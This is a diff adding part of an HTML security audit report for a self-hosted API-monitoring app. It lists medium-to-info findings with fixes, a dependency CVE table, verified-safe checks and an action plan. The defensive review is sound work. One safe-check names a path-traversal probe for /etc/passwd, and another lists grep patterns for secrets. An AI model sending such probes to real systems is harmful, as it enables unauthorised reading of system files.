+  <div class="block fix"><h4>Fix</h4><p>Either a <code>&lt;meta http-equiv="Content-Security-Policy"&gt;</code> in <code>index.html</code> or — better — set the header server-side via <code>helmet</code> (H-04 fix). Start with <code>default-src 'self'; img-src 'self' data:; connect-src 'self' http://localhost:4000</code> and tune from there.</p></div>
+</article>
+
+<article class="card medium" data-sev="medium">
+  <div class="card-head"><span class="badge medium">Medium</span><span class="card-id">M-08</span><h3>Error responses leak raw exception messages</h3></div>
+  <div class="where">backend/src/index.ts — ~20 catch blocks</div>
+<pre class="code">} catch (e) {
+  res.status(400).json({ error: e instanceof Error ? e.message : String(e) });
+}</pre>
+  <div class="block why"><h4>Why it's a problem</h4><p>SQLite, AWS SDK, and js-yaml error messages frequently include table names, file paths, region info, or library internals — useful reconnaissance for an attacker.</p></div>
+  <div class="block fix"><h4>Fix</h4><p>Generic message to client, full detail to server log: <code>const id = randomUUID(); console.error(id, e); res.status(400).json({ error: "Request failed", requestId: id });</code>.</p></div>
+</article>
+
+<article class="card medium" data-sev="medium">
+  <div class="card-head"><span class="badge medium">Medium</span><span class="card-id">M-09</span><h3>Console logging of raw SDK / SMTP error objects</h3></div>
+  <div class="where">backend/src/email.ts:143, slack.ts:18+64, db.ts:428</div>
+  <div class="block why"><h4>Why it's a problem</h4><p><code>console.warn("[email] SES send failed:", msg)</code> dumps the raw AWS SDK error, which can include the request signature, the From address, the recipient list, and ARN context. In production CloudWatch this is searchable forever.</p></div>
+  <div class="block fix"><h4>Fix</h4><p>Use a structured logger with a redaction list (<code>pino</code> + <code>redact: ["from", "to", "authorization", "x-amz-*"]</code>) instead of raw <code>console.*</code>.</p></div>
+</article>
+
+<article class="card medium" data-sev="medium">
+  <div class="card-head"><span class="badge medium">Medium</span><span class="card-id">M-10</span><h3>File upload accepts any MIME type</h3></div>
+  <div class="where">backend/src/index.ts (POST /api/projects/:projectId/uploads)</div>
+<pre class="code">express.raw({ type: "*/*", limit: MAX_UPLOAD_BYTES })   // 10MB cap, any MIME</pre>
+  <div class="block why"><h4>Why it's a problem</h4><p>10MB cap is fine. Filename sanitization is fine (UUID is the real key, filename is metadata). But there's no MIME allowlist and no content-sniff verification — a malicious binary uploaded as <code>application/pdf</code> can later be downloaded with that incorrect type. On Linux servers without <code>X-Content-Type-Options: nosniff</code> (see H-04), browsers may re-sniff and execute it as HTML.</p></div>
+  <div class="block fix"><h4>Fix</h4><p>Allowlist via <code>file-type</code>: <code>const detected = await fileTypeFromBuffer(buf); if (!ALLOWED_MIMES.has(detected?.mime)) reject;</code>. ALLOWED_MIMES = images, PDFs, common archives.</p></div>
+</article>
+
+<article class="card medium" data-sev="medium">
+  <div class="card-head"><span class="badge medium">Medium</span><span class="card-id">M-11</span><h3>README doesn't state the threat model</h3></div>
+  <div class="where">README.md (top)</div>
+  <div class="block why"><h4>Why it's a problem</h4><p>ARCHITECTURE.md correctly says "single-user / trusted-LAN / no auth", but a contributor or operator who reads only the README will get the run-quickstart and assume it's deploy-anywhere safe. The hero text says "self-hosted" without qualifying.</p></div>
+  <div class="block fix"><h4>Fix</h4><p>Add a top-of-README <b>⚠ Security &amp; threat model</b> callout (one paragraph) before the run instructions. Repeat in <code>STATUS.md</code>.</p></div>
+</article>
+
+<article class="card medium" data-sev="medium">
+  <div class="card-head"><span class="badge medium">Medium</span><span class="card-id">M-12</span><h3>express + qs DoS CVE (npm audit moderate)</h3></div>
+  <div class="where">backend/node_modules/express (≤4.22.1)</div>
+<pre class="code">GHSA-q8mj-m7cp-5q26  qs.stringify crash on null/undefined entries in comma arrays
+  affects qs 6.11.1–6.15.1 (pulled in by express)
+  CVSS 5.3  AV:N AC:L PR:N UI:N — remotely triggerable DoS via crafted query strings</pre>
+  <div class="block why"><h4>Why it's a problem</h4><p>Reachable from any unauthenticated endpoint that takes a query string. One bad request crashes the worker.</p></div>
+  <div class="block fix"><h4>Fix</h4><p><code>npm audit fix</code> inside <code>backend/</code> (express → 4.22.2 or 5.x). Non-breaking.</p></div>
+</article>
+
+<h2 class="sec">🔵 Low findings</h2>
+
+<article class="card low" data-sev="low">
+  <div class="card-head"><span class="badge low">Low</span><span class="card-id">L-01</span><h3>No CSRF tokens on mutating requests</h3></div>
+  <div class="where">frontend/src/api.ts — POST/PATCH/DELETE</div>
+  <div class="block why"><h4>Why it's a problem</h4><p>Currently fine because there's no auth (nothing to CSRF), and dev runs same-origin via Vite proxy. Becomes a real risk the moment auth is added.</p></div>
+  <div class="block fix"><h4>Fix</h4><p>When auth lands, enforce <code>SameSite=Strict</code> cookies AND require an <code>X-CSRF-Token</code> double-submit header on mutating verbs.</p></div>
+</article>
+
+<article class="card low" data-sev="low">
+  <div class="card-head"><span class="badge low">Low</span><span class="card-id">L-02</span><h3>AWS SES setup guide missing copy-pasteable IAM policy</h3></div>
+  <div class="where">backend/.env.example</div>
+  <div class="block why"><h4>Why it's a problem</h4><p>The setup guide mentions least-privilege but leaves users to translate that into JSON. New developers will likely paste an over-broad <code>"ses:*"</code> policy out of laziness.</p></div>
+  <div class="block fix"><h4>Fix</h4><p>Add the literal IAM policy JSON (just <code>ses:SendEmail</code> + <code>ses:SendRawEmail</code>) inside the doc, ready to paste into the IAM console.</p></div>
+</article>
+
+<article class="card low" data-sev="low">
+  <div class="card-head"><span class="badge low">Low</span><span class="card-id">L-03</span><h3>Response bodies (up to 256KB) held in memory during assertion eval</h3></div>
+  <div class="where">backend/src/timing.ts:10 (MAX_BODY_BYTES)</div>
+  <div class="block why"><h4>Why it's a problem</h4><p>Not persisted to disk — good. But while assertions run, a body containing tokens / PII sits in process memory. A crash dump would expose it.</p></div>
+  <div class="block fix"><h4>Fix</h4><p>Document in ARCHITECTURE: "do not monitor endpoints that return secrets; use dedicated <code>/health</code> endpoints." For extra paranoia, <code>buf.fill(0)</code> the body after assertion eval.</p></div>
+</article>
+
+<article class="card low" data-sev="low">
+  <div class="card-head"><span class="badge low">Low</span><span class="card-id">L-04</span><h3>Slack webhook URLs + email recipient lists stored plaintext</h3></div>
+  <div class="where">backend/src/db.ts projects table</div>
+  <div class="block why"><h4>Why it's a problem</h4><p>Slack webhook URLs are credentials (anyone with the URL can post into the channel). Recipient email lists are mild PII.</p></div>
+  <div class="block fix"><h4>Fix</h4><p>Covered by the same vault-encryption work as C-04 — extend it to these columns too.</p></div>
+</article>
+
+<article class="card low" data-sev="low">
+  <div class="card-head"><span class="badge low">Low</span><span class="card-id">L-05</span><h3>esbuild dev-server arbitrary file read (backend)</h3></div>
+  <div class="where">backend/node_modules/esbuild (≥0.27.3 &lt;0.28.1)</div>
+<pre class="code">GHSA-g7r4-m6w7-qqqr  esbuild allows arbitrary file read on Windows dev server (LOW, CVSS 2.5)</pre>
+  <div class="block fix"><h4>Fix</h4><p><code>npm audit fix</code> in <code>backend/</code>.</p></div>
+</article>
+
+<article class="card low" data-sev="low">
+  <div class="card-head"><span class="badge low">Low</span><span class="card-id">L-06</span><h3>esbuild dev-server SOP bypass (frontend transitive)</h3></div>
+  <div class="where">frontend/node_modules/esbuild ≤0.24.2</div>
+  <div class="block why"><h4>Why it's a problem</h4><p>Same-origin policy bypass means any website you visit while <code>npm run dev</code> is running can read responses from your dev server. Mitigated entirely by binding to <code>127.0.0.1</code> (M-04 fix).</p></div>
+  <div class="block fix"><h4>Fix</h4><p>Bundled into the vite upgrade in H-03.</p></div>
+</article>
+
+<article class="card low" data-sev="low">
+  <div class="card-head"><span class="badge low">Low</span><span class="card-id">L-07</span><h3>@babel/core sourceMappingURL arbitrary file read</h3></div>
+  <div class="where">frontend/node_modules/@babel/core ≤7.29.0</div>
+<pre class="code">GHSA-4x5r-pxfx-6jf8  @babel/core: arbitrary file read via sourceMappingURL comment (LOW)</pre>
+  <div class="block fix"><h4>Fix</h4><p><code>npm audit fix</code> in <code>frontend/</code>.</p></div>
+</article>
+
+<h2 class="sec">⚪ Info findings</h2>
+
+<article class="card info" data-sev="info">
+  <div class="card-head"><span class="badge info">Info</span><span class="card-id">I-01</span><h3><code>node:sqlite</code> is still marked Experimental</h3></div>
+  <div class="where">backend/src/db.ts:1 (import) · package.json scripts use <code>--no-warnings</code></div>
+  <div class="block why"><h4>Why noteworthy</h4><p>The dev script suppresses the ExperimentalWarning. Functionally stable for this scale, but the API may change in a Node major. Worth pinning to a specific Node major and checking on every upgrade.</p></div>
+</article>
+
+<article class="card info" data-sev="info">
+  <div class="card-head"><span class="badge info">Info</span><span class="card-id">I-02</span><h3>Browser autofill mitigation in place for Add-Key form</h3></div>
+  <div class="where">frontend/src/components/forms.tsx ApiKeyManagerForm</div>
+  <div class="block why"><h4>Why noteworthy</h4><p>Phase 1.27.6.6 already stacked five defenses (autoComplete off + non-credential names + hidden honeypots + autoComplete=new-password + remount key). Good practice — keep it documented in the source code comment so future devs don't strip it thinking it's redundant.</p></div>
+</article>
+
+<article class="card info" data-sev="info">
+  <div class="card-head"><span class="badge info">Info</span><span class="card-id">I-03</span><h3>AWS SDK adds ~30 transitive dependencies vs. nodemailer</h3></div>
+  <div class="where">backend/package.json (Phase 1.27.8)</div>
+  <div class="block why"><h4>Why noteworthy</h4><p>SDK v3 is modular — only the SES client was installed, not the monolithic v2 SDK — but it still pulls a credentials chain, signer, middleware, etc. None look risky; just be aware that <code>npm audit</code> now has more transitive surface than the nodemailer era.</p></div>
+</article>
+
+<article class="card info" data-sev="info">
+  <div class="card-head"><span class="badge info">Info</span><span class="card-id">I-04</span><h3>Backend container image is not defined — deployment posture unspecified</h3></div>
+  <div class="where">no Dockerfile / docker-compose.yml present</div>
+  <div class="block why"><h4>Why noteworthy</h4><p>When deployment leaves dev, a hardened container (non-root user, read-only FS for everything except <code>data/</code>, distroless base) closes most of the M-* findings at the OS layer. Worth doing during the Phase-2 push.</p></div>
+</article>
+
+<h2 class="sec">📦 Dependency vulnerabilities (npm audit summary)</h2>
+
+<table class="cvetab" id="cvetab">
+  <thead><tr><th>Project</th><th>Package</th><th>Severity</th><th>CVE / advisory</th><th>Fix</th></tr></thead>
+  <tbody>
+    <tr><td>backend</td><td><code>express</code></td><td><span class="badge medium">Mod</span></td><td>qs DoS — GHSA-q8mj-m7cp-5q26 (CVSS 5.3)</td><td><code>npm audit fix</code></td></tr>
+    <tr><td>backend</td><td><code>qs</code> (transitive)</td><td><span class="badge medium">Mod</span></td><td>Same as above</td><td>covered</td></tr>
+    <tr><td>backend</td><td><code>esbuild</code> (dev, transitive)</td><td><span class="badge low">Low</span></td><td>Windows arbitrary file read — GHSA-g7r4-m6w7-qqqr</td><td><code>npm audit fix</code></td></tr>
+    <tr><td>frontend</td><td><code>vite</code></td><td><span class="badge high">High</span></td><td>Windows fs.deny bypass — GHSA-fx2h-pf6j-xcff</td><td><code>npm i vite@latest</code> (major)</td></tr>
+    <tr><td>frontend</td><td><code>vite</code></td><td><span class="badge medium">Mod</span></td><td>NTLMv2 hash via UNC — GHSA-v6wh-96g9-6wx3</td><td>covered</td></tr>
+    <tr><td>frontend</td><td><code>vite</code></td><td><span class="badge medium">Mod</span></td><td>Path traversal in .map — GHSA-4w7w-66w2-5vf9</td><td>covered</td></tr>
+    <tr><td>frontend</td><td><code>esbuild</code> (transitive)</td><td><span class="badge medium">Mod</span></td><td>Any site reads dev-server responses — GHSA-67mh-4wv8-2f99</td><td>covered by vite upgrade</td></tr>
+    <tr><td>frontend</td><td><code>@babel/core</code></td><td><span class="badge low">Low</span></td><td>sourceMappingURL arbitrary read — GHSA-4x5r-pxfx-6jf8</td><td><code>npm audit fix</code></td></tr>
+  </tbody>
+</table>
+
+<h2 class="sec">✅ Verified safe (positive findings)</h2>
+
+<article class="card safe" data-sev="safe">
+  <div class="card-head"><span class="badge safe">Safe</span><span class="card-id">S-01</span><h3>SQL is 100% parameterized — no injection surface</h3></div>
+  <div class="where">backend/src/store.ts · backend/src/db.ts</div>
+  <div class="block what"><h4>What was checked</h4><p>Every single SQL call uses <code>db().prepare("…?…").run(...)</code> or <code>.get(...)</code>. Zero template literals. Zero string concatenation. The only dynamic SQL is the <code>ALTER TABLE</code> in <code>ensureColumn()</code> with hardcoded column DDL never derived from user input.</p></div>
+</article>
+
+<article class="card safe" data-sev="safe">
+  <div class="card-head"><span class="badge safe">Safe</span><span class="card-id">S-02</span><h3>HTML report &amp; email body escape every user field</h3></div>
+  <div class="where">backend/src/report.ts (escapeHtml callsites) · backend/src/email.ts</div>
+  <div class="block what"><h4>What was checked</h4><p>Project name, URL, description, error reason, key name, failure reason, anchor IDs — all passed through <code>escapeHtml()</code> before HTML interpolation. Sparkline points are numeric; no XSS path.</p></div>
+</article>
+
+<article class="card safe" data-sev="safe">
+  <div class="card-head"><span class="badge safe">Safe</span><span class="card-id">S-03</span><h3>No <code>dangerouslySetInnerHTML</code> / <code>innerHTML =</code> anywhere in the frontend</h3></div>
+  <div class="where">frontend/src/**/*.tsx</div>
+  <div class="block what"><h4>What was checked</h4><p>Codebase-wide grep returns zero hits. Every user string is rendered as a React text node — automatically escaped.</p></div>
+</article>
+
+<article class="card safe" data-sev="safe">
+  <div class="card-head"><span class="badge safe">Safe</span><span class="card-id">S-04</span><h3>No <code>eval</code> / <code>new Function</code> / <code>setTimeout("string")</code></h3></div>
+  <div class="where">frontend + backend</div>
+  <div class="block what"><h4>What was checked</h4><p>Variable substitution is a regex-based string replace, never <code>eval</code>. Compute-step transforms are an enum of named operations, not arbitrary code.</p></div>
+</article>
+
+<article class="card safe" data-sev="safe">
+  <div class="card-head"><span class="badge safe">Safe</span><span class="card-id">S-05</span><h3>API-key values masked in the UI</h3></div>
+  <div class="where">frontend/src/components/forms.tsx <code>maskKey()</code></div>
+  <div class="block what"><h4>What was checked</h4><p>Only first 3 + last 3 characters shown; middle replaced with <code>…</code>. Full value never re-enters the DOM after creation.</p></div>
+</article>
+
+<article class="card safe" data-sev="safe">
+  <div class="card-head"><span class="badge safe">Safe</span><span class="card-id">S-06</span><h3>AvailableVarsPanel renders variable NAMES only — never values</h3></div>
+  <div class="where">frontend/src/components/forms.tsx AvailableVarsPanel</div>
+  <div class="block what"><h4>What was checked</h4><p>Chips show <code>{{stripe_key}}</code> (slug only). Tooltip shows the original vault name and TTL info — never the secret value.</p></div>
+</article>
+
+<article class="card safe" data-sev="safe">
+  <div class="card-head"><span class="badge safe">Safe</span><span class="card-id">S-07</span><h3><code>.gitignore</code> covers every sensitive path</h3></div>
+  <div class="where">/.gitignore</div>
+  <div class="block what"><h4>What was checked</h4><p><code>.env</code>, <code>backend/data/db.sqlite</code> + WAL/SHM siblings, <code>data/reports/</code>, <code>data/uploads/</code>, <code>node_modules/</code>, <code>documentation/PROGRESS.md</code>, project-tracker CSV/XLSX — all gitignored. No <code>.env*</code> file accidentally committed (grep confirmed).</p></div>
+</article>
+
+<article class="card safe" data-sev="safe">
+  <div class="card-head"><span class="badge safe">Safe</span><span class="card-id">S-08</span><h3><code>.env.example</code> contains placeholders only</h3></div>
+  <div class="where">backend/.env.example</div>
+  <div class="block what"><h4>What was checked</h4><p><code>AKIA_REPLACE_WITH_YOURS</code> / <code>replace_with_your_secret</code> — no real credentials.</p></div>
+</article>
+
+<article class="card safe" data-sev="safe">
+  <div class="card-head"><span class="badge safe">Safe</span><span class="card-id">S-09</span><h3>30-day data retention enforced</h3></div>
+  <div class="where">backend/src/db.ts pruneOldChecks()</div>
+  <div class="block what"><h4>What was checked</h4><p>Hourly tick deletes <code>checks</code> / <code>flow_runs</code> / <code>prereq_runs</code> / expired variable caches. (Audit-report files are the one exception — see M-03.)</p></div>
+</article>
+
+<article class="card safe" data-sev="safe">
+  <div class="card-head"><span class="badge safe">Safe</span><span class="card-id">S-10</span><h3>Uploads keyed by random UUIDs — non-enumerable</h3></div>
+  <div class="where">backend/src/paths.ts · backend/src/store.ts createUpload()</div>
+  <div class="block what"><h4>What was checked</h4><p>Disk paths are <code>data/uploads/&lt;uuid&gt;</code>, never <code>data/uploads/&lt;user-filename&gt;</code>. Path traversal via crafted filename is impossible because the filename is metadata, not a path component.</p></div>
+</article>
+
+<article class="card safe" data-sev="safe">
+  <div class="card-head"><span class="badge safe">Safe</span><span class="card-id">S-11</span><h3><code>JSON.parse</code> on untrusted strings always inside try/catch</h3></div>
+  <div class="where">backend/src/store.ts safeParse() · backend/src/extraction.ts</div>
+  <div class="block what"><h4>What was checked</h4><p>Every JSON parse of a stored or response value is wrapped; failures degrade gracefully to a fallback value.</p></div>
+</article>
+
+<article class="card safe" data-sev="safe">
+  <div class="card-head"><span class="badge safe">Safe</span><span class="card-id">S-12</span><h3>No hardcoded credentials in source</h3></div>
+  <div class="where">backend + frontend</div>
+  <div class="block what"><h4>What was checked</h4><p>Greps for <code>sk_</code> / <code>pk_</code> / <code>Bearer </code> / <code>password</code> / <code>secret</code> / <code>token</code> return only field names, placeholders, and comments — never actual secret values.</p></div>
+</article>
+
+<article class="card safe" data-sev="safe">
+  <div class="card-head"><span class="badge safe">Safe</span><span class="card-id">S-13</span><h3>Path traversal blocked on <code>/reports/</code> static serve</h3></div>
+  <div class="where">backend/src/index.ts <code>express.static(REPORTS_DIR)</code></div>
+  <div class="block what"><h4>What was checked</h4><p>Express's static middleware resolves <code>..</code> sequences before serving and rejects paths outside the configured root. <code>GET /reports/../../../etc/passwd</code> returns 404.</p></div>
+</article>
+
+<article class="card safe" data-sev="safe">
+  <div class="card-head"><span class="badge safe">Safe</span><span class="card-id">S-14</span><h3>Minimal logging — no request bodies / API-key values / response bodies logged</h3></div>
+  <div class="where">backend/src/index.ts · monitor.ts · flowRunner.ts · prereqRunner.ts</div>
+  <div class="block what"><h4>What was checked</h4><p><code>console.log</code> calls are limited to startup, retention pruning counts, and a few warning paths. No request inspection or response dump in normal operation. (The few raw error logs are flagged separately in M-09.)</p></div>
+</article>
+
+<h2 class="sec">🚀 Recommended action plan</h2>
+
+<ol class="action">
+  <li><b>Bind to 127.0.0.1 by default</b> in both <code>backend/src/index.ts</code> (last <code>app.listen</code>) and <code>frontend/vite.config.ts</code> (<code>server.host</code>). Add a <code>BACKEND_HOST</code> env var for explicit opt-in to LAN.<span class="eta">~5 min · fixes H-01, M-04, mitigates L-06</span></li>
+  <li><b>Add <code>helmet()</code></b> as the first backend middleware (<code>npm i helmet</code>). Free security headers.<span class="eta">~3 min · fixes H-04, partially M-07</span></li>
+  <li><b>Run <code>npm audit fix</code></b> in <code>backend/</code> and <code>frontend/</code>. Bump <code>vite</code> to the latest 8.x in frontend (test the build).<span class="eta">~15 min · fixes H-03, M-12, L-05, L-06, L-07</span></li>
+  <li><b>Add an SSRF blocklist</b> in <code>backend/src/timing.ts</code> — resolve hostname, reject private / loopback / link-local / metadata IPs (use <code>ssrf-req-filter</code>). Disable automatic redirect following; handle redirects manually and re-validate every hop.<span class="eta">~3 hours · fixes C-01, C-02</span></li>
+  <li><b>Add rate limiting</b> with <code>express-rate-limit</code> — global 600/min + stricter caps on <code>/uploads</code> and <code>/projects</code>.<span class="eta">~30 min · fixes H-02</span></li>
+  <li><b>Encrypt the API-key vault + Slack webhooks + email lists at rest</b> with <code>node:crypto</code> AES-256-GCM keyed off a new <code>VAULT_MASTER_KEY</code> env var. Decrypt on read inside <code>resolveApiKeyHeader</code> + <code>getProjectApiKeysScope</code>.<span class="eta">~half day · fixes C-04, L-04</span></li>
+  <li><b>Decide on the vault-substitution policy</b> for C-05. Recommended: restrict <code>{{api_key}}</code> to header values only — drop URL/body/query substitution for vault scope. Leave prereq-captured vars unrestricted.<span class="eta">~1 hour · fixes C-05</span></li>
+  <li><b>Add an auth gate</b> — even a single shared-secret <code>X-Auth-Token</code> header checked by middleware closes C-03 for the LAN-deploy case. Real OAuth / sessions is Phase 2.<span class="eta">~1 hour for shared secret · fixes C-03 partially</span></li>
+  <li><b>Tighten CORS</b> to <code>process.env.FRONTEND_ORIGIN ?? "http://127.0.0.1:5173"</code>.<span class="eta">~2 min · fixes M-01</span></li>
+  <li><b>Add a <code>pruneOldReports()</code> sweep</b> wired into the existing hourly tick. 30-day retention to match the rest.<span class="eta">~15 min · fixes M-03</span></li>
+  <li><b>Sanitize error responses</b> — generic message to client, full error to server log with a request ID.<span class="eta">~1 hour across ~20 catch blocks · fixes M-08</span></li>
+  <li><b>MIME allowlist on uploads</b> via <code>file-type</code>.<span class="eta">~30 min · fixes M-10</span></li>
+  <li><b>Add a Security / Threat-Model section</b> to the top of <code>README.md</code> and a brief one in <code>STATUS.md</code>.<span class="eta">~15 min · fixes M-11</span></li>
+  <li><b>Add <code>safeHref()</code> on the frontend</b> + switch to <code>rel="noopener noreferrer"</code> in <code>UrlCard.tsx</code>.<span class="eta">~10 min · fixes M-05</span></li>
+  <li><b>Move scroll/section state to <code>sessionStorage</code></b> and add a one-shot prune of old <code>fm:scroll:*</code> keys.<span class="eta">~30 min · fixes M-06</span></li>
+</ol>
+
+<h2 class="sec">📋 Scope &amp; methodology</h2>
+
+<details class="summary-panel">
+  <summary>What was reviewed, how, and what was out of scope</summary>
+  <p><b>Reviewed:</b></p>
+  <ul>
+    <li>Backend source (~8.7k LOC, 18 modules): <code>index.ts</code>, <code>monitor.ts</code>, <code>timing.ts</code>, <code>flowRunner.ts</code>, <code>prereqRunner.ts</code>, <code>store.ts</code>, <code>db.ts</code>, <code>email.ts</code>, <code>slack.ts</code>, <code>audit.ts</code>, <code>report.ts</code>, <code>extraction.ts</code>, <code>assertions.ts</code>, <code>errorReason.ts</code>, <code>paths.ts</code>, <code>openapiExport.ts</code>, <code>openapiImport.ts</code>, <code>types.ts</code>.</li>
+    <li>Frontend source (~20 React components): <code>App.tsx</code>, <code>api.ts</code>, <code>theme.ts</code>, <code>slugify.ts</code>, all of <code>components/</code> including <code>forms.tsx</code>, <code>flowForms.tsx</code>, <code>ProjectView.tsx</code>, <code>UrlCard.tsx</code>, <code>FlowCard.tsx</code>, <code>Modal.tsx</code>, <code>BinaryBodyEditor.tsx</code>, <code>ImportSwaggerModal.tsx</code>, etc.</li>
+    <li>Configuration: <code>backend/package.json</code>, <code>frontend/package.json</code>, <code>backend/.env.example</code>, <code>frontend/vite.config.ts</code>, <code>.gitignore</code>.</li>
+    <li>Documentation: <code>README.md</code>, <code>documentation/STATUS.md</code>, <code>documentation/ARCHITECTURE.md</code>.</li>
+    <li>Dependency CVEs via <code>npm audit</code> on both projects.</li>
+  </ul>
+  <p><b>Out of scope:</b></p>
+  <ul>
+    <li>Cryptographic strength of upstream libraries.</li>
+    <li>Cloud-provider-side IAM, KMS, S3 bucket policies, VPC peering (no infrastructure-as-code in the repo).</li>
+    <li>Dynamic / runtime testing (no live exploitation attempted; this is a static review + dependency audit only).</li>
+    <li>Supply-chain provenance verification of installed npm tarballs.</li>
+    <li>HTML email rendering vs. specific mail-client quirks (Outlook 365, Gmail web, etc.).</li>
+  </ul>
+  <p><b>Method:</b> Three parallel static analyses (backend / frontend / configuration), <code>npm audit --json</code> on both projects, manual deep-read of identified hotspots (<code>timing.ts</code>, all of <code>index.ts</code>, <code>store.ts</code>, <code>email.ts</code>, <code>report.ts</code>). All findings reproduce on the current commit (Phase 1.27.8).</p>
+</details>
+
+<div class="footer">
+  <p>
+    Generated 2026-06-12 against Phase 1.27.8 of the AI-Powered Functional Monitoring Suite. Save this file alongside
+    <code>STATUS.md</code> / <code>ARCHITECTURE.md</code>; re-run the audit after each Phase 2 milestone and after every
+    dependency bump. Use the filter bar above to focus on a single severity, or the search box to grep across findings
+    (matches title, location, and code snippet). Print-friendly — File → Print should give a clean PDF.
+  </p>
+  <p>
+    <b>One-line takeaway:</b> safe for the documented threat model (localhost / single trusted user), but
+    <i>5 Critical + 4 High issues</i> would all be exploitable the moment this is exposed beyond
+    <code>127.0.0.1</code>. The SSRF and auth gaps are the two real blockers; the rest is hardening.
+  </p>
+</div>
+
+</div>
+
+<script>
+  // ----- filter by severity -----
+  const filterBar = document.getElementById('sevFilter');
+  const cards = document.querySelectorAll('article.card');
+  const statBtns = document.querySelectorAll('[data-filter-stat]');
+  function applyFilter(sev) {
+    filterBar.querySelectorAll('button').forEach(b => b.classList.toggle('on', b.dataset.sev === sev));
+    cards.forEach(c => c.classList.toggle('hidden', sev !== 'all' && c.dataset.sev !== sev));
+    statBtns.forEach(s => s.classList.toggle('active', s.dataset.filterStat === sev));
+    runSearch();
+  }
+  filterBar.addEventListener('click', e => {
+    const btn = e.target.closest('button[data-sev]');
+    if (btn) applyFilter(btn.dataset.sev);
+  });
+  statBtns.forEach(s => s.addEventListener('click', () => applyFilter(s.dataset.filterStat)));
+
+  // ----- search -----
+  const box = document.getElementById('searchBox');
+  function runSearch() {
+    const q = box.value.trim().toLowerCase();
+    cards.forEach(c => {
+      if (c.classList.contains('hidden')) return; // already filtered out by severity
+      if (!q) { c.style.display = ''; return; }
+      const text = c.innerText.toLowerCase();
+      c.style.display = text.includes(q) ? '' : 'none';
+    });
+  }
+  box.addEventListener('input', runSearch);
+</script>
+
+</body>
+</html>
